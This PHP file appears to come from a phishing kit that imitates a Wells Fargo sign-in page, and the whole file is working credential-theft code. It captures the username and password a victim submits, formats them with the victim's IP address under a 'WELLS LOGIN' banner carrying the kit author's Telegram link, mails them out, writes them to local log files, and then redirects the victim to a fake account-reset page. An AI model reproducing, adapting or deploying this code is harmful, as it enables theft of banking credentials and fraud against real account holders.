<?php
error_reporting(0);
session_start();
set_time_limit(0);
include '../main.php';
if($_POST['j_username'] == "" || $_POST['j_password'] == '') {

    $error = 'Please Enter a valid Username/Password';
    echo "<META HTTP-EQUIV='refresh' content='0; URL=./../signin.php?error=".$error."&appIdKey=".$_SESSION['key']."&country=US'>";
    exit();
}

$j_username = $_POST['j_username'];
$j_password = $_POST['j_password'];

$_SESSION['j_username'] = $j_username;
$_SESSION['j_password'] = $j_password;


$message  = "++-------------------------[ WELLS LOGIN ]-----------------------------++\n";
$message .= "Username			: ".$_SESSION['j_username']."\n";
$message .= "Password			: ".$_SESSION['j_password']."\n";
$message .= "IP Address		: ".$ip2."\n";
$message .= "++--------------[ CALI BUGGA https://t.me/oldcode]---------------++\n";


sendMail('LOGIN', $message);

$click = fopen("./logs/clicks.txt","a");
fwrite($click,"$ip2"."\n");
fclose($click);
$click = fopen("./logs/log_visitor.txt","a");
$jam = date("h:i:sa");
fwrite($click,$message);
fclose($click);
echo "<META HTTP-EQUIV='refresh' content='0; URL=./../reset_account.php?error=&appIdKey=".$_SESSION['key']."&country=US'>";
exit();



